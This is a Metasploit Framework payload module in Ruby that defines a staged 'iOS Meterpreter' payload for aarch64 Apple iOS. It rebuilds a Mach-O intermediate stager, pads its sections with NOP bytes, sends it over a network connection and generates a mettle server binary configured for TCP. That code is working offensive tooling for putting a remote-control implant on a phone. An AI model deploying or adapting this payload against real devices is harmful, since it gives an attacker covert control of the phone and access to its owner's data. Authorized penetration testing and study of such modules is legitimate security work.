##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/base/sessions/meterpreter_aarch64_apple_ios'
require 'msf/base/sessions/meterpreter_options'
require 'msf/base/sessions/mettle_config'
require 'macho'

module MetasploitModule
  include Msf::Sessions::MeterpreterOptions
  include Msf::Sessions::MettleConfig

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'iOS Meterpreter',
      'Description'   => 'Inject the mettle server payload (staged)',
      'Platform'      => 'apple_ios',
      'Author'        => [
        'parchedmind',  # osx_runbin
        'nologic',      # shellcc
        'timwr',        # metasploit integration
        ],
      'References'    => [
          [ 'URL', 'https://github.com/CylanceVulnResearch/osx_runbin' ],
          [ 'URL', 'https://github.com/nologic/shellcc' ]
        ],
      'Arch'         => ARCH_AARCH64,
      'License'      => MSF_LICENSE,
      'Session'      => Msf::Sessions::Meterpreter_aarch64_Apple_iOS,
      'Convention'   => 'sockedi',
      )
    )
  end

  def handle_intermediate_stage(conn, payload)
    stager_file = File.join(Msf::Config.data_directory, "meterpreter", "aarch64_iphone_darwin_stage")
    data = File.binread(stager_file)
    macho = MachO::MachOFile.new_from_bin(data)
    main_func = macho[:LC_MAIN].first
    entry_offset = main_func.entryoff

    output_data = ''
    for segment in macho.segments
      for section in segment.sections
        file_section = segment.fileoff + section.offset
        vm_addr = section.addr - 0x100000000
        section_data = data[file_section, section.size]
        if output_data.size < vm_addr
          output_data += "\x90" * (vm_addr - output_data.size)
        end
        if section_data
          output_data[vm_addr, output_data.size] = section_data
        end
      end
    end

    stager_length = [ output_data.length ].pack('V')
    print_status("Transmitting stage length value...(#{stager_length.length} bytes)")
    conn.put( stager_length )
    print_status("Transmitting intermediate stager...(#{output_data.length} bytes)")
    print_status("Transmitting intermediate stage...(#{output_data.unpack('H*')} )")
    conn.put(output_data) == output_data.length
  end

  def generate_stage(opts = {})
    mettle_macho = MetasploitPayloads::Mettle.new('aarch64-iphone-darwin',
      generate_config(opts.merge({scheme: 'tcp'}))).to_binary :exec
    mettle_macho
  end

end
